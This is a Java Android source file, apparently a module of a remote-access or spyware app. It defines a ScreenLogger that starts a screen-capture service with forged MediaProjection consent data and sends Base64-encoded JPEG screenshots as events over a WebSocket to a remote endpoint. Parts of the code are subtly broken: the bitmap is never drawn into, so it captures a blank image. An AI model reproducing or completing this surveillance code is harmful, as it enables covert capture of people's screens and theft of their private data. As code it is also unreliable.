package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;
import com.xrc.system.service.ScreenCaptureService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class ScreenLogger {
    private static final String TAG = Constants.TAG + ":ScreenLog";
    private static ScreenLogger instance;
    private final Context ctx;
    private final Handler handler;
    private boolean capturing = false;

    private ScreenLogger(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.handler = new Handler(Looper.getMainLooper());
    }

    public static synchronized ScreenLogger get(Context ctx) {
        if (instance == null) {
            instance = new ScreenLogger(ctx);
        }
        return instance;
    }

    public void startCapture() {
        if (capturing) return;
        Intent intent = new Intent(ctx, ScreenCaptureService.class);
        intent.putExtra("resultCode", -1);
        intent.putExtra("data", new Intent());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
        capturing = true;
        Log.i(TAG, "Screen capture started");
    }

    public void stopCapture() {
        Intent intent = new Intent(ctx, ScreenCaptureService.class);
        ctx.stopService(intent);
        capturing = false;
        Log.i(TAG, "Screen capture stopped");
    }

    public void takeScreenshot() {
        handler.post(() -> {
            try {
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) return;
                android.view.Display display = wm.getDefaultDisplay();
                android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
                display.getMetrics(metrics);
                Bitmap bmp = Bitmap.createBitmap(metrics.widthPixels, metrics.heightPixels, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bmp);
                // Note: This only captures the app's own window
                // Full screen capture requires MediaProjection
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                byte[] jpeg = baos.toByteArray();
                String b64 = android.util.Base64.encodeToString(jpeg, android.util.Base64.NO_WRAP);
                JSONObject data = new JSONObject();
                data.put("screenshot", b64);
                data.put("size", jpeg.length);
                WebSocketClient.get(ctx).sendEvent("screenshot", data);
                bmp.recycle();
            } catch (Exception e) {
                Log.e(TAG, "Screenshot failed", e);
            }
        });
    }

    public boolean isCapturing() {
        return capturing;
    }
}
